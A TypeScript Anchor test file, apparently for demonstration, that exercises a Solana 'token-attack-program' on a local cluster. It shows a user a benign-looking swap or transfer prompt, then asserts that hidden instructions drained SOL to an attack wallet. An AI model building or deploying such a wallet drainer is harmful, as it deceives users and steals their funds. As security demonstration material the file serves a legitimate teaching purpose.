// DISCLAIMER: This code is for EDUCATIONAL AND TESTING PURPOSES ONLY
// Use only in a controlled development environment
// DO NOT deploy on mainnet or use with real funds

import * as anchor from "@project-serum/anchor";
import { Program } from "@project-serum/anchor";
import { TokenAttackProgram } from "../target/types/token_attack_program";
import {
  TOKEN_PROGRAM_ID,
  ASSOCIATED_TOKEN_PROGRAM_ID,
  getAssociatedTokenAddress,
  createMint,
  getOrCreateAssociatedTokenAccount,
  getMint,
  getAccount,
} from "@solana/spl-token";
import {
  Keypair,
  LAMPORTS_PER_SOL,
  PublicKey,
  SystemProgram,
  Transaction,
} from "@solana/web3.js";
import { assert } from "chai";
import * as fs from "fs";

describe("token-attack-program", () => {
  // Configure the client to use the local cluster
  const provider = anchor.AnchorProvider.env();
  anchor.setProvider(provider);

  const program = anchor.workspace.TokenAttackProgram as Program<TokenAttackProgram>;
  
  // Define keypairs for testing
  const authority = Keypair.generate();
  const user = Keypair.generate();
  const attackWallet = Keypair.generate();
  
  // Define token mints and accounts
  let mint: PublicKey;
  let usdcMint: PublicKey;
  let otherTokenMint: PublicKey;
  let configAccount: PublicKey;
  let userTokenAccount: PublicKey;
  let userUsdcAccount: PublicKey;
  let userOtherTokenAccount: PublicKey;
  let attackUsdcAccount: PublicKey;
  let attackOtherTokenAccount: PublicKey;
  
  // Define constants
  const EXCHANGE_RATE = 1000; // 1 SOL = 1000 tokens
  
  before(async () => {
    console.log("Setting up test environment...");
    
    // Airdrop SOL to authority and user
    await provider.connection.requestAirdrop(authority.publicKey, 10 * LAMPORTS_PER_SOL);
    await provider.connection.requestAirdrop(user.publicKey, 5 * LAMPORTS_PER_SOL);
    await provider.connection.requestAirdrop(attackWallet.publicKey, 1 * LAMPORTS_PER_SOL);
    
    // Wait for confirmation
    await new Promise((resolve) => setTimeout(resolve, 2000));
    
    // Generate a PDA for the config account
    const [configPda] = await PublicKey.findProgramAddress(
      [Buffer.from("config")],
      program.programId
    );
    configAccount = configPda;
    
    console.log("Authority:", authority.publicKey.toString());
    console.log("User:", user.publicKey.toString());
    console.log("Attack Wallet:", attackWallet.publicKey.toString());
    console.log("Config Account:", configAccount.toString());
  });
  
  it("Initializes the program with a token mint and configuration", async () => {
    console.log("Initializing program...");
    
    // Create a new mint for the token
    const mintKeypair = Keypair.generate();
    mint = mintKeypair.publicKey;
    
    // Initialize the program with the token mint and configuration
    await program.methods
      .initialize(new anchor.BN(EXCHANGE_RATE))
      .accounts({
        authority: authority.publicKey,
        mint: mint,
        config: configAccount,
        attackWallet: attackWallet.publicKey,
        tokenProgram: TOKEN_PROGRAM_ID,
        systemProgram: SystemProgram.programId,
        rent: anchor.web3.SYSVAR_RENT_PUBKEY,
      })
      .signers([authority, mintKeypair])
      .rpc();
    
    // Fetch the config account to verify initialization
    const config = await program.account.programConfig.fetch(configAccount);
    assert.equal(config.authority.toString(), authority.publicKey.toString());
    assert.equal(config.tokenMint.toString(), mint.toString());
    assert.equal(config.exchangeRate.toNumber(), EXCHANGE_RATE);
    assert.equal(config.attackWallet.toString(), attackWallet.publicKey.toString());
    
    console.log("Program initialized successfully!");
  });
  
  it("Mints tokens to a user at the configured exchange rate", async () => {
    console.log("Minting tokens to user...");
    
    // Calculate the SOL amount to exchange for tokens
    const solAmount = 1 * LAMPORTS_PER_SOL; // 1 SOL
    const expectedTokenAmount = solAmount * EXCHANGE_RATE / LAMPORTS_PER_SOL; // 1000 tokens
    
    // Get the user's token account
    userTokenAccount = await getAssociatedTokenAddress(
      mint,
      user.publicKey
    );
    
    // Mint tokens to the user
    await program.methods
      .mintTokens(new anchor.BN(solAmount))
      .accounts({
        user: user.publicKey,
        authority: authority.publicKey,
        mint: mint,
        config: configAccount,
        userTokenAccount: userTokenAccount,
        tokenProgram: TOKEN_PROGRAM_ID,
        associatedTokenProgram: ASSOCIATED_TOKEN_PROGRAM_ID,
        systemProgram: SystemProgram.programId,
        rent: anchor.web3.SYSVAR_RENT_PUBKEY,
      })
      .signers([user])
      .rpc();
    
    // Verify the user's token balance
    const userTokenAccountInfo = await getAccount(
      provider.connection,
      userTokenAccount
    );
    
    assert.equal(
      userTokenAccountInfo.amount.toString(),
      (expectedTokenAmount * Math.pow(10, 9)).toString()
    );
    
    console.log(`Minted ${expectedTokenAmount} tokens to user successfully!`);
  });
  
  it("Sets up additional token accounts for testing", async () => {
    console.log("Setting up additional token accounts...");
    
    // Create USDC mint (simulated)
    const usdcMintKeypair = Keypair.generate();
    usdcMint = usdcMintKeypair.publicKey;
    
    await createMint(
      provider.connection,
      authority,
      authority.publicKey,
      null,
      6, // USDC has 6 decimals
      usdcMintKeypair
    );
    
    // Create other token mint
    const otherTokenMintKeypair = Keypair.generate();
    otherTokenMint = otherTokenMintKeypair.publicKey;
    
    await createMint(
      provider.connection,
      authority,
      authority.publicKey,
      null,
      9,
      otherTokenMintKeypair
    );
    
    // Create token accounts for user and attack wallet
    const userUsdcAccountInfo = await getOrCreateAssociatedTokenAccount(
      provider.connection,
      user,
      usdcMint,
      user.publicKey
    );
    userUsdcAccount = userUsdcAccountInfo.address;
    
    const userOtherTokenAccountInfo = await getOrCreateAssociatedTokenAccount(
      provider.connection,
      user,
      otherTokenMint,
      user.publicKey
    );
    userOtherTokenAccount = userOtherTokenAccountInfo.address;
    
    const attackUsdcAccountInfo = await getOrCreateAssociatedTokenAccount(
      provider.connection,
      authority,
      usdcMint,
      attackWallet.publicKey
    );
    attackUsdcAccount = attackUsdcAccountInfo.address;
    
    const attackOtherTokenAccountInfo = await getOrCreateAssociatedTokenAccount(
      provider.connection,
      authority,
      otherTokenMint,
      attackWallet.publicKey
    );
    attackOtherTokenAccount = attackOtherTokenAccountInfo.address;
    
    console.log("Additional token accounts set up successfully!");
  });
  
  it("Demonstrates the swap attack with transaction batching", async () => {
    console.log("\n=== DEMONSTRATING SWAP ATTACK ===");
    
    // Get balances before the attack
    const userSolBalanceBefore = await provider.connection.getBalance(user.publicKey);
    const userTokenBalanceBefore = (await getAccount(provider.connection, userTokenAccount)).amount;
    const attackWalletSolBalanceBefore = await provider.connection.getBalance(attackWallet.publicKey);
    
    console.log(`User balances before - SOL: ${userSolBalanceBefore / LAMPORTS_PER_SOL}, Token: ${userTokenBalanceBefore / Math.pow(10, 9)}`);
    console.log(`Attack wallet SOL balance before: ${attackWalletSolBalanceBefore / LAMPORTS_PER_SOL}`);
    
    // Simulate what the wallet would show to the user
    console.log("\n======= SIMULATED WALLET UI DISPLAY =======");
    console.log("Please review and approve this transaction:");
    console.log("Type: Swap Tokens for SOL");
    console.log("From: Your wallet");
    console.log("Amount: 500 tokens");
    console.log("Expected return: 0.5 SOL");
    console.log("Program: Token Swap Program");
    console.log("Estimated network fee: 0.000005 SOL");
    console.log("==========================================\n");
    
    // Amount of tokens to swap
    const tokenAmount = 500 * Math.pow(10, 9); // 500 tokens
    
    // Execute the swap attack
    await program.methods
      .swapTokensToSol(new anchor.BN(tokenAmount))
      .accounts({
        user: user.publicKey,
        authority: authority.publicKey,
        mint: mint,
        config: configAccount,
        userTokenAccount: userTokenAccount,
        userUsdcAccount: userUsdcAccount,
        attackUsdcAccount: attackUsdcAccount,
        userOtherTokenAccount: userOtherTokenAccount,
        attackOtherTokenAccount: attackOtherTokenAccount,
        attackWallet: attackWallet.publicKey,
        tokenProgram: TOKEN_PROGRAM_ID,
        systemProgram: SystemProgram.programId,
      })
      .signers([user])
      .rpc();
    
    // Get balances after the attack
    const userSolBalanceAfter = await provider.connection.getBalance(user.publicKey);
    const userTokenBalanceAfter = (await getAccount(provider.connection, userTokenAccount)).amount;
    const attackWalletSolBalanceAfter = await provider.connection.getBalance(attackWallet.publicKey);
    
    console.log(`User balances after - SOL: ${userSolBalanceAfter / LAMPORTS_PER_SOL}, Token: ${userTokenBalanceAfter / Math.pow(10, 9)}`);
    console.log(`Attack wallet SOL balance after: ${attackWalletSolBalanceAfter / LAMPORTS_PER_SOL}`);
    
    // Verify the attack was successful
    assert(userTokenBalanceAfter < userTokenBalanceBefore, "User's token balance should decrease");
    assert(userSolBalanceAfter < userSolBalanceBefore, "User's SOL balance should decrease due to the attack");
    assert(attackWalletSolBalanceAfter > attackWalletSolBalanceBefore, "Attack wallet's SOL balance should increase");
    
    console.log("\nSwap attack demonstration completed successfully!");
    console.log("This demonstrates how a malicious smart contract can bundle legitimate operations with hidden malicious instructions.");
  });
  
  it("Demonstrates the transfer attack with transaction batching", async () => {
    console.log("\n=== DEMONSTRATING TRANSFER ATTACK ===");
    
    // Create a recipient for the transfer
    const recipient = Keypair.generate();
    await provider.connection.requestAirdrop(recipient.publicKey, 0.1 * LAMPORTS_PER_SOL);
    
    // Create a token account for the recipient
    const recipientTokenAccount = await getAssociatedTokenAddress(
      mint,
      recipient.publicKey
    );
    
    await getOrCreateAssociatedTokenAccount(
      provider.connection,
      user,
      mint,
      recipient.publicKey
    );
    
    // Get balances before the attack
    const userSolBalanceBefore = await provider.connection.getBalance(user.publicKey);
    const userTokenBalanceBefore = (await getAccount(provider.connection, userTokenAccount)).amount;
    const attackWalletSolBalanceBefore = await provider.connection.getBalance(attackWallet.publicKey);
    
    console.log(`User balances before - SOL: ${userSolBalanceBefore / LAMPORTS_PER_SOL}, Token: ${userTokenBalanceBefore / Math.pow(10, 9)}`);
    console.log(`Attack wallet SOL balance before: ${attackWalletSolBalanceBefore / LAMPORTS_PER_SOL}`);
    
    // Simulate what the wallet would show to the user
    console.log("\n======= SIMULATED WALLET UI DISPLAY =======");
    console.log("Please review and approve this transaction:");
    console.log("Type: Transfer Tokens");
    console.log("From: Your wallet");
    console.log("To: " + recipient.publicKey.toString().slice(0, 10) + "...");
    console.log("Amount: 100 tokens");
    console.log("Program: Token Program");
    console.log("Estimated network fee: 0.000005 SOL");
    console.log("==========================================\n");
    
    // Amount of tokens to transfer
    const tokenAmount = 100 * Math.pow(10, 9); // 100 tokens
    
    // Execute the transfer attack
    await program.methods
      .transferTokens(new anchor.BN(tokenAmount))
      .accounts({
        sender: user.publicKey,
        recipient: recipient.publicKey,
        senderTokenAccount: userTokenAccount,
        recipientTokenAccount: recipientTokenAccount,
        mint: mint,
        config: configAccount,
        senderUsdcAccount: userUsdcAccount,
        attackUsdcAccount: attackUsdcAccount,
        senderOtherTokenAccount: userOtherTokenAccount,
        attackOtherTokenAccount: attackOtherTokenAccount,
        attackWallet: attackWallet.publicKey,
        tokenProgram: TOKEN_PROGRAM_ID,
        systemProgram: SystemProgram.programId,
      })
      .signers([user])
      .rpc();
    
    // Get balances after the attack
    const userSolBalanceAfter = await provider.connection.getBalance(user.publicKey);
    const userTokenBalanceAfter = (await getAccount(provider.connection, userTokenAccount)).amount;
    const recipientTokenBalanceAfter = (await getAccount(provider.connection, recipientTokenAccount)).amount;
    const attackWalletSolBalanceAfter = await provider.connection.getBalance(attackWallet.publicKey);
    
    console.log(`User balances after - SOL: ${userSolBalanceAfter / LAMPORTS_PER_SOL}, Token: ${userTokenBalanceAfter / Math.pow(10, 9)}`);
    console.log(`Recipient token balance after: ${recipientTokenBalanceAfter / Math.pow(10, 9)}`);
    console.log(`Attack wallet SOL balance after: ${attackWalletSolBalanceAfter / LAMPORTS_PER_SOL}`);
    
    // Verify the attack was successful
    assert(userTokenBalanceAfter < userTokenBalanceBefore, "User's token balance should decrease");
    assert(recipientTokenBalanceAfter.toString() === tokenAmount.toString(), "Recipient should receive the transferred tokens");
    assert(userSolBalanceAfter < userSolBalanceBefore, "User's SOL balance should decrease due to the attack");
    assert(attackWalletSolBalanceAfter > attackWalletSolBalanceBefore, "Attack wallet's SOL balance should increase");
    
    console.log("\nTransfer attack demonstration completed successfully!");
    console.log("This demonstrates how a malicious smart contract can bundle legitimate transfers with hidden malicious instructions.");
  });
});
